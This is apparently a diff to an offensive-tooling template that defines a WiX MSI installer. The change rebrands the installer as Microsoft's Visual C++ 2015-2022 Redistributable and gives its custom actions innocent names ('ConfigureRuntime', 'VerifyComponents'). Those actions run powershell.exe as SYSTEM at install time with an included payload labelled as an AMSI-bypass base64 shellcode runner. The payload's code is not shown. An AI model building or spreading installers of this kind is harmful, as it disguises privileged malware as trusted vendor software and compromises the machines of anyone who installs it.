@@ -8,15 +8,15 @@ metadata:
 content: |
   <?xml version="1.0" encoding="UTF-8"?>
   <Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
-    <Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111"
-             Name="23e23deeqwddeweqwde" Version="0.0.1" Manufacturer="Test1" Language="1033">
-      <Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package" />
+    <Product Id="*" UpgradeCode="CD1A3D8E-7F5B-42A9-B3C6-8D4E2F1A9C73"
+             Name="Microsoft Visual C++ 2015-2022 Redistributable (x64)" Version="14.36.32532.0" Manufacturer="Microsoft Corporation" Language="1033">
+      <Package InstallerVersion="200" Compressed="yes" Comments="Microsoft Corporation Installer Package" />
       <Media Id="1" Cabinet="product.cab" EmbedCab="yes" />
 
       <Directory Id="TARGETDIR" Name="SourceDir">
         <Directory Id="ProgramFilesFolder">
-          <Directory Id="INSTALLLOCATION" Name="Example">
-            <Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
+          <Directory Id="INSTALLLOCATION" Name="Microsoft Visual C++">
+            <Component Id="ApplicationFiles" Guid="3A7F2D9B-1E4C-8B5A-F6D3-2C9E7A4B8F1D">
             </Component>
           </Directory>
         </Directory>
@@ -26,10 +26,10 @@ content: |
         <ComponentRef Id="ApplicationFiles" />
       </Feature>
 
-      <Property Id="ShellExe" Value="powershell.exe" />
+      <Property Id="RuntimeHost" Value="powershell.exe" />
       <CustomAction
-        Id           ="install_step"
-        Property     ="ShellExe"
+        Id           ="ConfigureRuntime"
+        Property     ="RuntimeHost"
         ExeCommand   ="{{ include('payloads/transfer-amsi-bypass-shellcode-runner-windows-powershell-base64encoded.yaml') }}"
         Execute      ="deferred"
         Impersonate  ="no"
@@ -37,17 +37,17 @@ content: |
       />
 
       <CustomAction
-         Id          ="error_step"
-         Property    ="ShellExe"
-         ExeCommand  ='C:\eddgge.exe'
+         Id          ="VerifyComponents"
+         Property    ="RuntimeHost"
+         ExeCommand  ='C:\Program Files\Microsoft Visual C++\vc_redist.x64.exe'
          Return      ="check"
          Execute     ="deferred"
          Impersonate ="no"
       />
 
       <InstallExecuteSequence>
-        <Custom Action="install_step" After="InstallInitialize" />
-        <Custom Action="error_step" Before="InstallFinalize" />
+        <Custom Action="ConfigureRuntime" After="InstallInitialize" />
+        <Custom Action="VerifyComponents" Before="InstallFinalize" />
       </InstallExecuteSequence>
     </Product>
   </Wix>
